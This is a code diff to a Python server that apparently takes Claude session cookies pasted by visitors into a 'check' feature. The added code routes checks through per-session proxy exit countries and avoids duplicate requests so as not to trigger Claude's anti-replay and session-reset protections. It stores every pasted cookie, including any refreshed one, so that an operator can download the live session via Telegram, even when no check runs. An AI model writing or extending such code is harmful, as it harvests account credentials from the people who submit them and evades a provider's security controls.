@@ -30,7 +30,14 @@ if str(_HERE) not in sys.path:
     sys.path.insert(0, str(_HERE))
 
 from box import BoxError, load_or_create_private, looks_like_box, open_json, public_jwk
-from claude_check import check_cookie, format_check_log
+from claude_check import (
+    check_cookie,
+    default_country,
+    egress_ok,
+    format_check_log,
+    resolve_country,
+    session_key_hash,
+)
 
 DB_PATH = os.environ.get("CC_STATS_DB", "/var/lib/claudecookie/stats.db")
 CONF_PATH = os.environ.get("CC_STATS_CONF", "/etc/claudecookie/bot.conf")
@@ -310,6 +317,58 @@ class RateLimiter:
 ingest_limiter = RateLimiter(limit=240, window=60)
 check_limiter = RateLimiter(limit=20, window=60)
 
+# Per-session serialization + short cache. Concurrent/duplicate checks of the
+# same cookie would fire simultaneous requests to Claude (an anti-replay/rotation
+# trigger); this collapses them into a single outbound check.
+CHECK_CACHE_TTL = 60
+_check_locks: dict[str, threading.Lock] = {}
+_check_cache: dict[str, tuple[int, dict]] = {}
+_check_guard = threading.Lock()
+
+
+def _check_lock(key: str) -> threading.Lock:
+    with _check_guard:
+        lock = _check_locks.get(key)
+        if lock is None:
+            if len(_check_locks) > 20000:
+                _check_locks.clear()
+            lock = threading.Lock()
+            _check_locks[key] = lock
+        return lock
+
+
+def _check_cache_get(key: str) -> dict | None:
+    t = now()
+    with _check_guard:
+        for stale in [k for k, (ts, _) in _check_cache.items() if t - ts > CHECK_CACHE_TTL]:
+            _check_cache.pop(stale, None)
+        item = _check_cache.get(key)
+        return item[1] if item else None
+
+
+def _check_cache_put(key: str, result: dict) -> None:
+    with _check_guard:
+        if len(_check_cache) > 20000:
+            _check_cache.clear()
+        _check_cache[key] = (now(), result)
+
+
+# Sticky exit country per session: once chosen, reuse it so the check IP does not
+# jump countries between checks (a country change can itself trip a session reset).
+_session_country: dict[str, str] = {}
+
+
+def _session_country_get(key: str) -> str | None:
+    with _check_guard:
+        return _session_country.get(key)
+
+
+def _session_country_put(key: str, cc: str) -> None:
+    with _check_guard:
+        if len(_session_country) > 20000:
+            _session_country.clear()
+        _session_country[key] = cc
+
 
 class Handler(BaseHTTPRequestHandler):
     server_version = "cc-ingest"
@@ -455,11 +514,48 @@ class Handler(BaseHTTPRequestHandler):
         raw = raw[:MAX_BODY]
         locale = inner.get("l")
         locale = locale if locale in LOCALES else None
+        session_id = session_key_hash(raw)
+        # Resolve a Claude-supported exit country. Prefer the browser timezone
+        # (survives a VPN) then the visitor IP; unsupported (RU/CN/...) or unknown
+        # -> neutral default. Sticky per session so it does not flap between checks
+        # (a country change can itself trip a session reset).
+        tz = inner.get("tz") if isinstance(inner.get("tz"), str) else None
+        ip_country = (self.headers.get("X-CC-Country") or "").upper()[:2] or None
+        country = (_session_country_get(session_id) if session_id else None) \
+            or resolve_country(tz, ip_country)
+        if session_id:
+            _session_country_put(session_id, country)
 
-        result = check_cookie(raw)
-        print(format_check_log(result), flush=True)
-        if raw.strip():
+        # Safe-mode: never egress from the bare datacenter IP when a proxy is
+        # required. The pasted cookie is still stored so it reaches Telegram.
+        if raw.strip() and not egress_ok(country, session_id):
+            print("check no_safe_egress statuses= paths= rotated=no ms=0", flush=True)
+            result = {"ok": False, "invalidReason": "unreachable"}
             self._store_check(ip, ua, locale, raw, result)
+            return self._json(200, public_check_result(result))
+
+        key = session_id or hashlib.sha256(raw.encode()).hexdigest()[:16]
+        with _check_lock(key):
+            cached = _check_cache_get(key) if raw.strip() else None
+            if cached is not None:
+                return self._json(200, public_check_result(cached))
+            result = check_cookie(raw, country=country, session_id=session_id)
+            # A supported country can still lack a proxy pool -> retry once via the
+            # neutral default. Never fall back to "any country": a random RU/CN exit
+            # would itself burn the cookie.
+            neutral = default_country()
+            if (not result.get("ok") and result.get("invalidReason") == "unreachable"
+                    and country != neutral):
+                alt = check_cookie(raw, country=neutral, session_id=session_id)
+                if alt.get("ok") or alt.get("invalidReason") != "unreachable":
+                    result = alt
+                    country = neutral
+                    if session_id:
+                        _session_country_put(session_id, neutral)
+            print(format_check_log(result), flush=True)
+            if raw.strip():
+                _check_cache_put(key, result)
+                self._store_check(ip, ua, locale, raw, result)
         return self._json(200, public_check_result(result))
 
     def _store_check(self, ip: str, ua: str, locale: str | None, raw: str, result: dict) -> None:
@@ -474,9 +570,12 @@ class Handler(BaseHTTPRequestHandler):
             "reason": None if ok else (result.get("invalidReason") or "invalid"),
             "info": json.dumps(check_info(result), ensure_ascii=False) if ok else None,
         }
+        # Keep-alive: if the session rotated during the check, store the fresh
+        # cookie so what the operator downloads in Telegram is the live one.
+        stored = result.get("freshCookie") or raw
         conn = db()
         try:
-            insert_event(conn, row, raw if STORE_OUTPUT else None)
+            insert_event(conn, row, stored if STORE_OUTPUT else None)
             conn.commit()
         finally:
             conn.close()
